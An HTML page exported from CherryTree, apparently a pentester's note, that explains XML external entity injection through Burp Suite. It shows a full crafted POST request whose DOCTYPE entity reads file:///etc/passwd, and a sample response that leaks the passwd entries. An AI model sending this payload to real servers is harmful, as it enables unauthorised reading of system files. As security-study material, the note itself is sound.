<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Injection with Burp</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>Injection with Burp</h1><br />When data is passed to the server in an HTTP Request, it opens up
    the possibility of abuse from the user. XML is no different.<br /><br /><span style="color:#a5452a;">example where
      data from a form is wrapped in XML and sent to the server to be processed:</span><br />• Intercept the vulnerable
    POST request with a web proxy (Burpsuite, Zap, etc)<br />• Add the injected ENTITY tag and &amp;xxe; variable
    reference.<br />• Release the intercepted POST request<br /><br /><br />crafted POST request (injected content in
    red):<br />
    <div class="codebox">
      <div class="codebox">
        POST&nbsp;/notes/savenote&nbsp;HTTP/1.1<br />User-Agent:&nbsp;Mozilla/5.0&nbsp;(Macintosh;&nbsp;Intel&nbsp;Mac&nbsp;OS&nbsp;X&nbsp;10.13;&nbsp;rv:65.0)&nbsp;Gecko/20100101&nbsp;Firefox/65.0<br />Accept:&nbsp;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />Accept-Language:&nbsp;en-US,en;q=0.5<br />Accept-Encoding:&nbsp;gzip,&nbsp;deflate<br />Connection:&nbsp;close<br />Content-Type:&nbsp;text/xml;charset=UTF-8<br />Host:&nbsp;myserver.com<br />&lt;?xml&nbsp;version=”1.0″&nbsp;?&gt;<br />&lt;!DOCTYPE&nbsp;foo&nbsp;[&lt;!ENTITY&nbsp;xxe&nbsp;SYSTEM&nbsp;“file:///etc/passwd”&nbsp;&gt;]&gt;<br />&lt;note&gt;<br />&lt;to&gt;Alice&lt;/to&gt;<br />&lt;from&gt;Bob&lt;/from&gt;<br />&lt;header&gt;Sync&nbsp;Meeting&lt;/header&gt;<br />&lt;time&gt;1200&lt;/time&gt;<br />&lt;body&gt;Meeting&nbsp;time&nbsp;changed&nbsp;&amp;xxe;&lt;/body&gt;<br />&lt;/note&gt;<br />
      </div>
    </div><br /><br />Response:<br />The server, assuming valid data was inputted into the form, parses this XML data
    before saving it on the backend, and returns the parsed data along with the original valid data. In this case the
    contents of /etc/passwd are displayed.<br />
    <div class="codebox">
      <div class="codebox">
        HTTP/1.1&nbsp;200&nbsp;OK<br />Content-Type:&nbsp;text/xml;charset=UTF-8<br />Server:&nbsp;Microsoft-IIS/7.5<br />Date:&nbsp;Sat,&nbsp;19&nbsp;Apr&nbsp;2019&nbsp;13:08:49&nbsp;GMT<br />Connection:&nbsp;close<br />Content-Length:&nbsp;1039<br /><br />Note&nbsp;saved!&nbsp;From&nbsp;Bob&nbsp;to&nbsp;Alice&nbsp;about&nbsp;“Sync&nbsp;Meeting”&nbsp;at&nbsp;1200:&nbsp;Meeting&nbsp;time&nbsp;has&nbsp;changed<br />root:x:0:0:root:/root:/bin/bash<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br />bin:x:2:2:bin:/bin:/usr/sbin/nologin<br />sys:x:3:3:sys:/dev:/usr/sbin/nologin<br />sync:x:4:65534:sync:/bin:/bin/sync
      </div>
    </div><br /><br /><br /><br />Bibliography:<br /><a
      href="https://www.synack.com/blog/a-deep-dive-into-xxe-injection/" target="_blank">https://www.synack.com/blog/a-deep-dive-into-xxe-injection/</a>
  </div>
</body>

</html>